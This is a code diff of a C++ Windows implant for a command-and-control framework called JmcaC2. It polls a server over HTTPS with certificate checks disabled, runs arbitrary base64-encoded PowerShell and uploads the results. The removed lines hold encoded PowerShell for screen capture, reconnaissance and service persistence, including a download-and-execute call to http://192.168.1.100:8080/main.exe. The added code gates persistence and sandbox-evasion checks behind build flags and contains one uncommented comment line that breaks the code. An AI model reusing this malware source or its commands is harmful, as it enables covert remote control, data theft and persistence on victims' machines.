@@ -18,28 +18,10 @@ const wchar_t *ACCEPTED_MIME_TYPES[] = {
     L"text/plain", L"application/octet-stream", L"text/html",
     L"multipart/form-data", NULL};
 
-int CreateTCPConn();
-bool sendHTTPTaskResult();
-string runPSCommand(string command);
-bool sendRequestedFile(const string &filePath);
 string runEncodedPSCommand(string command);
-void screenshot();
-bool sendTaskResults(const string &data);
+bool sendResults(const string &data, bool asStream = false);
 
 static wstring beaconName = L"";
-void screenshot()
-{
-    string encodedCommand{"QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAsAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwAgAD0AIABbAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMALgBTAGMAcgBlAGUAbgBdADoAOgBBAGwAbABTAGMAcgBlAGUAbgBzAA0ACgANAAoAJAB0AG8AcAAgACAAIAAgAD0AIAAoACQAcwBjAHIAZQBlAG4AcwAuAEIAbwB1AG4AZABzAC4AVABvAHAAIAAgACAAIAB8ACAATQBlAGEAcwB1AHIAZQAtAE8AYgBqAGUAYwB0ACAALQBNAGkAbgBpAG0AdQBtACkALgBNAGkAbgBpAG0AdQBtAA0ACgAkAGwAZQBmAHQAIAAgACAAPQAgACgAJABzAGMAcgBlAGUAbgBzAC4AQgBvAHUAbgBkAHMALgBMAGUAZgB0ACAAIAAgAHwAIABNAGUAYQBzAHUAcgBlAC0ATwBiAGoAZQBjAHQAIAAtAE0AaQBuAGkAbQB1AG0AKQAuAE0AaQBuAGkAbQB1AG0ADQAKACQAcgBpAGcAaAB0ACAAIAA9ACAAKAAkAHMAYwByAGUAZQBuAHMALgBCAG8AdQBuAGQAcwAuAFIAaQBnAGgAdAAgACAAfAAgAE0AZQBhAHMAdQByAGUALQBPAGIAagBlAGMAdAAgAC0ATQBhAHgAaQBtAHUAbQApAC4ATQBhAHgAaQBtAHUAbQANAAoAJABiAG8AdAB0AG8AbQAgAD0AIAAoACQAcwBjAHIAZQBlAG4AcwAuAEIAbwB1AG4AZABzAC4AQgBvAHQAdABvAG0AIAB8ACAATQBlAGEAcwB1AHIAZQAtAE8AYgBqAGUAYwB0ACAALQBNAGEAeABpAG0AdQBtACkALgBNAGEAeABpAG0AdQBtAA0ACgANAAoAJABiAG8AdQBuAGQAcwAgACAAIAA9ACAAWwBEAHIAYQB3AGkAbgBnAC4AUgBlAGMAdABhAG4AZwBsAGUAXQA6ADoARgByAG8AbQBMAFQAUgBCACgAJABsAGUAZgB0ACwAIAAkAHQAbwBwACwAIAAkAHIAaQBnAGgAdAAsACAAJABiAG8AdAB0AG8AbQApAA0ACgAkAGIAbQBwACAAIAAgACAAIAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBEAHIAYQB3AGkAbgBnAC4AQgBpAHQAbQBhAHAAIAAoAFsAaQBuAHQAXQAkAGIAbwB1AG4AZABzAC4AdwBpAGQAdABoACkALAAgACgAWwBpAG4AdABdACQAYgBvAHUAbgBkAHMALgBoAGUAaQBnAGgAdAApAA0ACgAkAGcAcgBhAHAAaABpAGMAcwAgAD0AIABbAEQAcgBhAHcAaQBuAGcALgBHAHIAYQBwAGgAaQBjAHMAXQA6ADoARgByAG8AbQBJAG0AYQBnAGUAKAAkAGIAbQBwACkADQAKAA0ACgAkAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoACQAYgBvAHUAbgBkAHMALgBMAG8AYwBhAHQAaQBvAG4ALAAgAFsARAByAGEAdwBpAG4AZwAuAFAAbwBpAG4AdABdADoAOgBFAG0AcAB0AHkALAAgACQAYgBvAHUAbgBkAHMALgBzAGkAegBlACkADQAKAA0ACgAkAGIAbQBwAC4AUwBhAHYAZQAoACIAJABlAG4AdgA6AFQARQBNAFAAXAB0AGUAcwB0AC4AcABuAGcAIgApAA0ACgANAAoAJABnAHIAYQBwAGgAaQBjAHMALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAJABiAG0AcAAuAEQAaQBzAHAAbwBzAGUAKAApAA0ACgA="};
-
-    runEncodedPSCommand(encodedCommand);
-    char buffer[MAX_PATH];
-    DWORD len = GetTempPathA(MAX_PATH, buffer);
-    // temp path usually looks like:
-    // C:\Users\<USERNAME>\AppData\Local\Temp
-    string path = std::string(buffer, len);
-    path += "test.png";
-    sendRequestedFile(path);
-}
 
 bool runTask(string outBuffer, DWORD dwSize)
 {
@@ -67,24 +49,7 @@ bool runTask(string outBuffer, DWORD dwSize)
     }
     string cmd = outBuffer.substr(startPos, pipePos - startPos);
 
-    if (cmd == "powershell")
-    {
-        string res = runPSCommand(outBuffer.substr(pipePos + 1));
-        sendTaskResults(res);
-    }
-    else if (cmd == "enumservices")
-    {
-        string encodedCommand{
-            "JABWAHUAbABuAFMAZQByAHYAaQBjAGUAcwAgAD0AIABnAHcAbQBpACAAdwBpAG4AMwAyAF8AcwBlAHIAdgBpAGMAZQAgAHwAIAA/AHsAJABfAH0AIAB8ACAAdwBoAGUAcgBlACAAewAoACQAXwAuAHAAYQB0AGgAbgBhAG0AZQAgAC0AbgBlACAAJABuAHUAbABsACkAIAAtAGEAbgBkACAAKAAkAF8ALgBwAGEAdABoAG4AYQBtAGUALgB0AHIAaQBtACgAKQAgAC0AbgBlACAAIgAiACkAfQAgAHwAIAB3AGgAZQByAGUAIAB7AC0AbgBvAHQAIAAkAF8ALgBwAGEAdABoAG4AYQBtAGUALgBTAHQAYQByAHQAcwBXAGkAdABoACgAIgBgACIAIgApAH0AIAB8ACAAdwBoAGUAcgBlACAAewAoACQAXwAuAHAAYQB0AGgAbgBhAG0AZQAuAFMAdQBiAHMAdAByAGkAbgBnACgAMAAsACAAJABfAC4AcABhAHQAaABuAGEAbQBlAC4ASQBuAGQAZQB4AE8AZgAoACIALgBlAHgAZQAiACkAIAArACAANAApACkAIAAtAG0AYQB0AGMAaAAgACIALgAqACAALgAqACIAfQA7ACAAaQBmACAAKAAkAFYAdQBsAG4AUwBlAHIAdgBpAGMAZQBzACkAIAB7ACAAZgBvAHIAZQBhAGMAaAAgACgAJABzAGUAcgB2AGkAYwBlACAAaQBuACAAJABWAHUAbABuAFMAZQByAHYAaQBjAGUAcwApAHsAIAAkAG8AdQB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEMAbwBsAGwAZQBjAHQAaQBvAG4AcwAuAFMAcABlAGMAaQBhAGwAaQB6AGUAZAAuAE8AcgBkAGUAcgBlAGQARABpAGMAdABpAG8AbgBhAHIAeQA7ACAAJABvAHUAdAAuAGEAZABkACgAIgBTAGUAcgB2AGkAYwBlAE4AYQBtAGUAIgAsACAAJABzAGUAcgB2AGkAYwBlAC4AbgBhAG0AZQApADsAIAAkAG8AdQB0AC4AYQBkAGQAKAAiAFAAYQB0AGgAIgAsACAAJABzAGUAcgB2AGkAYwBlAC4AcABhAHQAaABuAGEAbQBlACkAOwAgACQAbwB1AHQAIAB9ACAAfQA="};
-
-        string res = runEncodedPSCommand(encodedCommand);
-        sendTaskResults(res);
-    }
-    else if (cmd == "screenshot")
-    {
-        screenshot();
-    }
-    else if (cmd == "sleep")
+    if (cmd == "sleep")
     {
         int seconds{};
         try
@@ -99,25 +64,14 @@ bool runTask(string outBuffer, DWORD dwSize)
 
         currentSleep = seconds * 100000 ? seconds : currentSleep;
     }
-    else if (cmd == "systemprofile")
+    else
     {
-        string encodedCommand{"dwBoAG8AYQBtAGkAIAAvAHAAcgBpAHYAOwB3AGgAbwBhAG0AaQAgAC8AZwByAG8AdQBwAHMAOwBuAGUAdAAgAHUAcwBlAHIAOwBzAHkAcwB0AGUAbQBpAG4AZgBvADsAZwBlAHQALQBwAHIAbwBjAGUAcwBzADsAaQBwAGMAbwBuAGYAaQBnAA=="};
-        // [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("whoami /priv;whoami /groups;net user;systeminfo;get-process;ipconfig"))
-        string res = runEncodedPSCommand(encodedCommand);
-        sendTaskResults(res);
-    }
-    else if (cmd == "persistence")
-    {
-        string encodedCommand{"TgBlAHcALQBTAGUAcgB2AGkAYwBlACAALQBOAGEAbQBlACAAJwBQAGUAcgBzAGkAcwB0AGUAbgBjAGUAJwAgAC0AQgBpAG4AYQByAHkAUABhAHQAaABOAGEAbQBlACAAJwBDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAYwBtAGQALgBlAHgAZQAgAC8AYwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAC0AbgBvAHAAIAAtAHcAIABoAGkAZABkAGUAbgAgAC0AYwAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAwADoAOAAwADgAMAAvAG0AYQBpAG4ALgBlAHgAZQApACcAIAAtAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAgACcASgBtAGMAYQBDADIAUABlAHIAcwBpAHMAdABlAG4AYwBlACcAIAAtAFMAdABhAHIAdAB1AHAAVAB5AHAAZQAgAEEAdQB0AG8AbQBhAHQAaQBjAA=="};
-        //  $cmd="New-Service -Name 'Persistence' -BinaryPathName 'C:\Windows\System32\cmd.exe /c powershell.exe -nop -w hidden -c IEX
-        // (New-Object Net.WebClient).DownloadString(http://192.168.1.100:8080/main.exe)' -Description 'JmcaC2Persistence' -StartupType Automatic"
-        // DELETE FOR TESTING : (Get-WmiObject -Class Win32_Service -Filter "Name='Persistence'").delete()
-        string res = runEncodedPSCommand(encodedCommand);
-        sendTaskResults(res);
-    }
-    else if (cmd == "file") {
-        string path = outBuffer.substr(pipePos + 1);
-        sendRequestedFile(path);
+        // the client always expects an encoded ps command
+        // the command also specifies if it wants the response type to be
+        // a stream or a file. We could probably consolidate them
+        string encodedPsCmd = outBuffer.substr(pipePos + 1);
+        string res = runEncodedPSCommand(encodedPsCmd);
+        sendResults(res, cmd == "stream");
     }
 
     return true;
@@ -131,16 +85,16 @@ string runEncodedPSCommand(string command)
     string powershellCommand =
         "powershell -NoProfile -NonInteractive -e \"" + command + "\"";
 
-    FILE *pPipe = _popen(powershellCommand.c_str(), "rt");
+    // read binary in case we want files
+    FILE *pPipe = _popen(powershellCommand.c_str(), "rb");
 
     if (!pPipe)
         return "ERROR";
 
-    while (fgets(psBuffer, DEFAULT_PS_BUFLEN, pPipe))
+    size_t bytesRead = 0;
+    while ((bytesRead = fread(psBuffer, 1, sizeof(psBuffer), pPipe)) > 0)
     {
-        res += psBuffer;
-        puts(psBuffer); // THIS IS THE ONLY WAY TO GET STDOUT FIXME: NOT
-                        // EVEN WHEN I COUT << RESULT
+        res.append(psBuffer, bytesRead);
     }
 
     int exitCode = _pclose(pPipe);
@@ -183,7 +137,7 @@ bool fetchTasks(char **outBuffer, DWORD *dwSizeOut)
     }
 
     if (!(hHTTPRequest = WinHttpOpenRequest(
-              hHTTPConnection, L"GET", RESOURCE_NAME, NULL, WINHTTP_NO_REFERER,
+              hHTTPConnection, L"GET", L"/", NULL, WINHTTP_NO_REFERER,
               ACCEPTED_MIME_TYPES, WINHTTP_FLAG_SECURE)))
     {
         return fetchWinHTTPError("WinHttpOpenRequest");
@@ -293,13 +247,8 @@ bool fetchTasks(char **outBuffer, DWORD *dwSizeOut)
     return didReceiveResponse;
 }
 
-bool sendRequestedFile(const string &filePath)
+bool sendResults(const string &result, bool asStream)
 {
-    if (!fs::exists(filePath))
-    {
-        sendTaskResults("Error: file path does not exist " + filePath);
-        return false;
-    }
 
     HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
     bool isRequestSuccessful{}, didReceiveResponse{};
@@ -318,8 +267,15 @@ bool sendRequestedFile(const string &filePath)
         return fetchWinHTTPError("WinHttpOpen");
     }
 
+    // different paths based on
+    wstring path = L"/";
+    if (!asStream)
+    {
+        path = L"/upload";
+    }
+
     if (!(hHTTPRequest = WinHttpOpenRequest(
-              hHTTPConnection, L"POST", L"/upload", NULL, WINHTTP_NO_REFERER,
+              hHTTPConnection, L"POST", path.c_str(), NULL, WINHTTP_NO_REFERER,
               ACCEPTED_MIME_TYPES, WINHTTP_FLAG_SECURE)))
     {
         return fetchWinHTTPError("WinHttpOpenRequest");
@@ -337,37 +293,46 @@ bool sendRequestedFile(const string &filePath)
         return fetchWinHTTPError("WinHttpSetOption");
     }
 
-    // read the file if it exists and add to response
-    uintmax_t fileSize = fs::file_size(filePath);
-    vector<char> fileBuf(fileSize);
-
-    ifstream fin(filePath, ios::binary);
-    fin.read(fileBuf.data(), fileSize);
-    fin.close();
-    fs::path fileNamePath = fs::path(filePath).filename();
-    wstring fileName = fileNamePath.wstring();
-
-    // Build headers
-    wstring headerStr = L"Beacon-Name: " + beaconName + L"\r\n" +
-                        L"Task-Index: " + currentTaskIndex + L"\r\n" +
-                        L"File-Name: " + fileName + L"\r\n" +
-                        L"File-Length: " + to_wstring(fileSize) + L"\r\n" +
-                        L"Content-Type: application/octet-stream\r\n" +
-                        L"Content-Length: " + to_wstring(fileSize) + L"\r\n";
-
-    // Send request with no body yet
-    if (!WinHttpSendRequest(hHTTPRequest, headerStr.c_str(), (DWORD)-1,
-                            WINHTTP_NO_REQUEST_DATA, 0, (DWORD)fileSize, 0))
+    if (asStream)
     {
-        return fetchWinHTTPError("WinHttpSendRequest");
+        wstring headers = L"Content-Type: multipart/form-data\r\n";
+
+        headers += L"Beacon-Name: " + beaconName + L"\r\n";
+        headers += L"Task-Index: " + currentTaskIndex + L"\r\n";
+
+        // should be replaced if POST
+        if (!(isRequestSuccessful = WinHttpSendRequest(
+                  hHTTPRequest, headers.c_str(), (DWORD)-1, (LPVOID)result.data(),
+                  (DWORD)result.size(), (DWORD)result.size(), 0)))
+        {
+            return fetchWinHTTPError("WinHttpSendRequest");
+        }
     }
-
-    // Write raw file bytes
-    DWORD bytesWritten = 0;
-    if (!WinHttpWriteData(hHTTPRequest, fileBuf.data(), (DWORD)fileSize,
-                          &bytesWritten))
+    else
     {
-        return fetchWinHTTPError("WinHttpWriteData");
+        uintmax_t fileSize = result.size();
+        // Build headers
+        wstring headerStr = L"Beacon-Name: " + beaconName + L"\r\n" +
+                            L"Task-Index: " + currentTaskIndex + L"\r\n" +
+                            L"File-Name: " + L"Task_" + currentTaskIndex + L"_Results" + L"\r\n" +
+                            L"File-Length: " + to_wstring(fileSize) + L"\r\n" +
+                            L"Content-Type: application/octet-stream\r\n" +
+                            L"Content-Length: " + to_wstring(fileSize) + L"\r\n";
+
+        // Send request with no body yet
+        if (!WinHttpSendRequest(hHTTPRequest, headerStr.c_str(), (DWORD)-1,
+                                WINHTTP_NO_REQUEST_DATA, 0, (DWORD)fileSize, 0))
+        {
+            return fetchWinHTTPError("WinHttpSendRequest");
+        }
+
+        // Write raw file bytes
+        DWORD bytesWritten = 0;
+        if (!WinHttpWriteData(hHTTPRequest, result.data(), (DWORD)fileSize,
+                              &bytesWritten))
+        {
+            return fetchWinHTTPError("WinHttpWriteData");
+        }
     }
 
     // Receive server response
@@ -392,107 +357,6 @@ bool sendRequestedFile(const string &filePath)
 
     return true;
 }
-bool sendTaskResults(const string &data)
-{
-    HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
-    bool isRequestSuccessful{}, didReceiveResponse{};
-
-    if (!(hHTTPSession = WinHttpOpen(
-              L"JmcaC2 Task Results", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
-              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)))
-    {
-        return fetchWinHTTPError("WinHttpOpen");
-    }
-
-    if (!(hHTTPConnection = WinHttpConnect(hHTTPSession, HTTP_SERVER_IP,
-                                           (INTERNET_PORT)HTTP_SERVER_PORT, 0)))
-    {
-        return fetchWinHTTPError("WinHttpOpen");
-    }
-
-    if (!(hHTTPRequest = WinHttpOpenRequest(
-              hHTTPConnection, L"POST", RESOURCE_NAME, NULL, WINHTTP_NO_REFERER,
-              ACCEPTED_MIME_TYPES, WINHTTP_FLAG_SECURE)))
-    {
-        return fetchWinHTTPError("WinHttpOpenRequest");
-    }
-
-    cout << "Request Sent" << endl;
-
-    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
-                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
-                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
-
-    if (!WinHttpSetOption(hHTTPRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags,
-                          sizeof(flags)))
-    {
-        return fetchWinHTTPError("WinHttpSetOption");
-    }
-
-    wstring headers = L"Content-Type: multipart/form-data\r\n";
-
-    headers += L"Beacon-Name: " + beaconName + L"\r\n";
-    headers += L"Task-Index: " + currentTaskIndex + L"\r\n";
-
-    // should be replaced if POST
-    if (!(isRequestSuccessful = WinHttpSendRequest(
-              hHTTPRequest, headers.c_str(), (DWORD)-1, (LPVOID)data.data(),
-              (DWORD)data.size(), (DWORD)data.size(), 0)))
-    {
-        return fetchWinHTTPError("WinHttpSendRequest");
-    }
-
-    if (!(didReceiveResponse = WinHttpReceiveResponse(hHTTPRequest, NULL)))
-    {
-        return fetchWinHTTPError("WinHttpReceiveResponse");
-    }
-
-    DWORD dwSize = 0;
-
-    if (hHTTPRequest)
-    {
-        WinHttpCloseHandle(hHTTPRequest);
-    }
-    if (hHTTPConnection)
-    {
-        WinHttpCloseHandle(hHTTPConnection);
-    }
-    if (hHTTPSession)
-    {
-        WinHttpCloseHandle(hHTTPSession);
-    }
-
-    return didReceiveResponse;
-}
-
-string runPSCommand(string command)
-{
-    char psBuffer[DEFAULT_PS_BUFLEN];
-    string res;
-
-    string powershellCommand =
-        "powershell -NoProfile -NonInteractive -Command \"" + command + "\"";
-
-    FILE *pPipe = _popen(powershellCommand.c_str(), "rt");
-
-    if (!pPipe)
-    {
-        return "ERROR";
-    }
-
-    while (fgets(psBuffer, DEFAULT_PS_BUFLEN, pPipe))
-    {
-        res += psBuffer;
-        puts(psBuffer); // THIS IS THE ONLY WAY TO GET STDOUT FIXME: NOT EVEN
-                        // WHEN I COUT << RESULT
-    }
-
-    int exitCode = _pclose(pPipe);
-
-    return res;
-
-    // TODO: Make this process injection?
-}
 
 void estPersistence()
 {
@@ -516,19 +380,25 @@ void estPersistence()
 
 int main(int argc, const char **argv)
 {
-    // Establish Persistence
+// Establish Persistence
+// enable during build with -DPERSIST
+#ifdef PERSIST
     estPersistence();
+#endif
 
+// enable during build with -DEVASION_CHECKS
+#ifdef EVASION_CHECKS
     // Run all checks
-    // BOOL cpuOK = checkCPU();
-    // BOOL ramOK = checkRAM();
-    // BOOL hddOK = checkHDD();
-    // BOOL processesOK = checkProcesses();
+    BOOL cpuOK = checkCPU();
+    BOOL ramOK = checkRAM();
+    BOOL hddOK = checkHDD();
+    BOOL processesOK = checkProcesses();
 
-    // Check if all tests passed
-    // if (!cpuOK || !ramOK || !hddOK || !processesOK) {
-    //     return 0;
-    // }
+    Check if all tests passed if (!cpuOK || !ramOK || !hddOK || !processesOK)
+    {
+        return 0;
+    }
+#endif
 
     char *outBuffer = nullptr;
     DWORD dwSize = 0;
